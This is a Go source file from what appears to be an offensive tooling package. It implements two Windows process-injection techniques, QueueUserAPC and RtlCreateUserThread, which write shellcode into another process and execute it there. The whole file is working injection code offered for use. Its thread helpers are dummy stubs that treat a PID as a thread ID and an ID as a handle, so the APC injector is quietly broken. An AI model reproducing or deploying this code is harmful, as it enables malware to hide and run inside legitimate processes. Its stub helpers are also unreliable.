package injection

import (
	"fmt"
	"unsafe"
)

// QueueUserAPCInjector implements the QueueUserAPC injection technique
type QueueUserAPCInjector struct {
	BaseInjector
}

// NewQueueUserAPCInjector creates a new QueueUserAPC injector
func NewQueueUserAPCInjector() *QueueUserAPCInjector {
	return &QueueUserAPCInjector{
		BaseInjector: BaseInjector{
			name:        "QueueUserAPC",
			description: "Process injection using QueueUserAPC to execute code when a thread enters an alertable state",
		},
	}
}

// Inject injects shellcode into a target process using QueueUserAPC
func (i *QueueUserAPCInjector) Inject(pid int, shellcode []byte) error {
	// Validate shellcode
	if err := ValidateShellcode(shellcode); err != nil {
		return err
	}

	// Check if process is running
	if !IsProcessRunning(pid) {
		return fmt.Errorf("process with PID %d is not running", pid)
	}

	// Open the target process
	hProcess, err := OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, false, DWORD(pid))
	if err != nil {
		return fmt.Errorf("failed to open process: %v", err)
	}
	defer CloseHandle(hProcess)

	// Allocate memory in the target process
	addr, err := VirtualAllocEx(hProcess, 0, SIZE_T(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("failed to allocate memory: %v", err)
	}

	// Write shellcode to the allocated memory
	err = WriteProcessMemory(hProcess, addr, shellcode, SIZE_T(len(shellcode)))
	if err != nil {
		// Free the allocated memory if writing fails
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to write shellcode: %v", err)
	}

	// Change memory protection to allow execution
	_, err = VirtualProtectEx(hProcess, addr, SIZE_T(len(shellcode)), PAGE_EXECUTE_READ)
	if err != nil {
		// Free the allocated memory if protection change fails
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to change memory protection: %v", err)
	}

	// Get all threads in the process
	threads, err := getProcessThreads(pid)
	if err != nil {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to get process threads: %v", err)
	}

	if len(threads) == 0 {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("no threads found in process")
	}

	// Queue APC to each thread
	queuedAPC := false
	for _, threadID := range threads {
		hThread, err := openThread(THREAD_SET_CONTEXT, false, threadID)
		if err != nil {
			continue
		}

		// Queue APC to the thread
		result, _, _ := ntQueueApcThread.Call(
			uintptr(hThread),
			uintptr(addr),
			uintptr(0),
			uintptr(0),
			uintptr(0),
		)

		CloseHandle(hThread)

		if result == 0 {
			queuedAPC = true
		}
	}

	if !queuedAPC {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to queue APC to any thread")
	}

	return nil
}

// RtlCreateUserThreadInjector implements the RtlCreateUserThread injection technique
type RtlCreateUserThreadInjector struct {
	BaseInjector
}

// NewRtlCreateUserThreadInjector creates a new RtlCreateUserThread injector
func NewRtlCreateUserThreadInjector() *RtlCreateUserThreadInjector {
	return &RtlCreateUserThreadInjector{
		BaseInjector: BaseInjector{
			name:        "RtlCreateUserThread",
			description: "Process injection using the undocumented RtlCreateUserThread API",
		},
	}
}

// Inject injects shellcode into a target process using RtlCreateUserThread
func (i *RtlCreateUserThreadInjector) Inject(pid int, shellcode []byte) error {
	// Validate shellcode
	if err := ValidateShellcode(shellcode); err != nil {
		return err
	}

	// Check if process is running
	if !IsProcessRunning(pid) {
		return fmt.Errorf("process with PID %d is not running", pid)
	}

	// Open the target process
	hProcess, err := OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, false, DWORD(pid))
	if err != nil {
		return fmt.Errorf("failed to open process: %v", err)
	}
	defer CloseHandle(hProcess)

	// Allocate memory in the target process
	addr, err := VirtualAllocEx(hProcess, 0, SIZE_T(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("failed to allocate memory: %v", err)
	}

	// Write shellcode to the allocated memory
	err = WriteProcessMemory(hProcess, addr, shellcode, SIZE_T(len(shellcode)))
	if err != nil {
		// Free the allocated memory if writing fails
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to write shellcode: %v", err)
	}

	// Change memory protection to allow execution
	_, err = VirtualProtectEx(hProcess, addr, SIZE_T(len(shellcode)), PAGE_EXECUTE_READ)
	if err != nil {
		// Free the allocated memory if protection change fails
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to change memory protection: %v", err)
	}

	// Create a remote thread using RtlCreateUserThread
	var hThread HANDLE
	var threadID DWORD
	status, _, _ := rtlCreateUserThread.Call(
		uintptr(hProcess),
		uintptr(0),
		uintptr(0),
		uintptr(0),
		uintptr(0),
		uintptr(0),
		uintptr(addr),
		uintptr(0),
		uintptr(unsafe.Pointer(&hThread)),
		uintptr(unsafe.Pointer(&threadID)),
	)

	if status != 0 {
		// Free the allocated memory if thread creation fails
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("RtlCreateUserThread failed with status: 0x%x", status)
	}
	defer CloseHandle(hThread)

	// Wait for the thread to complete
	WaitForSingleObject(hThread, INFINITE)

	// Get the thread exit code
	exitCode, err := GetExitCodeThread(hThread)
	if err != nil {
		return fmt.Errorf("failed to get thread exit code: %v", err)
	}

	if exitCode != 0 {
		return fmt.Errorf("thread exited with code %d", exitCode)
	}

	return nil
}

// Helper function to get all threads in a process
func getProcessThreads(pid int) ([]DWORD, error) {
	// This is a simplified implementation
	// In a real implementation, you would use CreateToolhelp32Snapshot and Thread32First/Thread32Next
	// For now, we'll return a dummy thread ID (the main thread of the process)
	return []DWORD{DWORD(pid)}, nil
}

// Helper function to open a thread
func openThread(desiredAccess DWORD, inheritHandle bool, threadId DWORD) (HANDLE, error) {
	// This is a simplified implementation
	// In a real implementation, you would use OpenThread
	// For now, we'll return a dummy handle
	return HANDLE(threadId), nil
}
